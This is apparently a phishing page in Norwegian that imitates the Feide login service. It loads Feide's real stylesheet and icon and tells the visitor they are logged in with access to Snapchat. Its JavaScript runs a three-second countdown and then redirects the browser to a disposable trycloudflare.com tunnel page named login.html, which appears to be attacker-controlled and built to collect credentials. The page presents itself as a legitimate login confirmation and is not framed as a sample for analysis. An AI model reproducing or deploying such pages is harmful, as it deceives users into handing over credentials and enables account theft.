<!DOCTYPE html>
<html lang="no">
<head>
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, user-scalable=yes">
    <title>Logg inn med Feide</title>
    <link rel="stylesheet" type="text/css" href="https://idp.feide.no/simplesaml/module.php/feide/css/feide2.fcdc247b.css" />
    <link rel="icon" type="image/ico" href="https://idp.feide.no/simplesaml/module.php/feide/img/favicon.ico">
    <script type="text/javascript">
        var countdown = 3; // Start countdown at 3 seconds
        function updateCountdown() {
            document.getElementById("countdown").innerText = countdown + " sekunder igjen...";
            countdown--; // Decrease countdown by 1 each time
            if (countdown < 0) {
                window.location.href = "https://symptoms-cleanup-batteries-animals.trycloudflare.com/login.html/"; // Redirect when countdown reaches 0
            }
        }

        setInterval(updateCountdown, 1000); // Update every second
    </script>
</head>
<body>
    <div id="wrapper">
        <header id="main-head" role="banner">
            <nav>
                <div id="language-chooser-wrapper" class="not-visible"></div>
            </nav>
            <div class="clear"></div>
        </header>
        <article id="content">
            <h1>Logg inn med Feide</h1>
            <section id="main">
                <div class="main" role="main">
                    <p>Takk for at du logget inn!</p>
                    <p>Du har n√• tilgang til Snapchat.</p>
                    <p id="countdown">3 sekunder igjen...</p> <!-- Display the countdown here -->
                </div>
            </section>
        </article>
        <footer>
            <p>Feide leveres av Sikt</p>
        </footer>
    </div>
</body>
</html>
